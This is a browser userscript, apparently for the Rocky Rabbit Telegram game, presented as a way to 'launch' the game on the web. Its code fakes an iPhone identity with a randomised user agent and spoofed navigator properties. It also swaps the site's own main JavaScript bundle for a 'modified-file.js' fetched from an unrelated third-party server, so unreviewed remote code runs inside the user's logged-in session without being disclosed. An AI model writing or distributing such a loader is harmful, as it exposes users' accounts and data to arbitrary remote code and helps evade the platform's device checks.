// ==UserScript==
// @name         Racky Rabbit Web
// @namespace    http://www.google.com/
// @version      1.1
// @description  Launch Racky Rabbit on Telegram Web
// @author       Reza
// @match        *://*.rockyrabbit.io/*
// @grant        none
// @icon         https://rockyrabbit.io/images/about1.png
// @downloadURL  https://github.com/rezamoradi4042/Racky-Rabbit/raw/main/Racky-Rabbit-Web.user.js
// @updateURL    https://github.com/rezamoradi4042/Racky-Rabbit/raw/main/Racky-Rabbit-Web.user.js
// @homepage     https://github.com/rezamoradi4042/Racky-Rabbit
// ==/UserScript==

(() => {
  'use strict';

  const getRandomElement = (array) => array[Math.floor(Math.random() * array.length)];

  const getRandomiOSUserAgent = () => {
    const iOSVersions = ['14_0', '14_1', '14_2', '14_3', '14_4', '14_5', '14_6', '14_7', '14_8',
                         '15_0', '15_1', '15_2', '15_3', '15_4', '15_5', '15_6', '15_7',
                         '16_0', '16_1', '16_2', '16_3', '16_4', '16_5', '16_6', '16_7',
                         '17_0', '17_1', '17_2', '17_3', '17_4', '17_5'];
    const iPhoneModels = ['iPhone11,2', 'iPhone11,4', 'iPhone11,6', 'iPhone11,8', 'iPhone12,1',
                          'iPhone12,3', 'iPhone12,5', 'iPhone13,1', 'iPhone13,2', 'iPhone13,3',
                          'iPhone13,4', 'iPhone14,2', 'iPhone14,3', 'iPhone14,4', 'iPhone14,5'];
    const randomVersion = getRandomElement(iOSVersions);
    const randomModel = getRandomElement(iPhoneModels);
    return `Mozilla/5.0 (${randomModel}; CPU iPhone OS ${randomVersion} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1`;
  };

  const replaceScriptUrl = () => {
    const urlPattern = /\/v\/\d+-\d+-\d+\/assets\/index-[a-zA-Z0-9_]+\.js$/;
    const newUrl = 'https://s1.rezaserveronlineshop.website/getjs/modified-file.js';
    const scripts = document.getElementsByTagName('script');
    for (let script of scripts) {
      if (urlPattern.test(script.src)) {
        const newScript = document.createElement('script');
        newScript.src = newUrl;
        newScript.type = 'text/javascript';
        script.parentNode.replaceChild(newScript, script);
      }
    }
  };

  const setNavigatorProperties = () => {
    Object.defineProperties(navigator, {
      userAgent: { get: () => getRandomiOSUserAgent() },
      platform: { value: 'iPhone' },
      vendor: { value: 'Apple Computer, Inc.' },
      deviceMemory: { value: undefined },
      maxTouchPoints: { value: 5 }
    });
  };

  const observeDOMChanges = () => {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.addedNodes.length) {
          replaceScriptUrl();
        }
      });
    });
    const config = { childList: true, subtree: true };
    observer.observe(document.body, config);
  };

  const initialize = () => {
    setNavigatorProperties();
    observeDOMChanges();
    replaceScriptUrl();
  };

  initialize();

})();
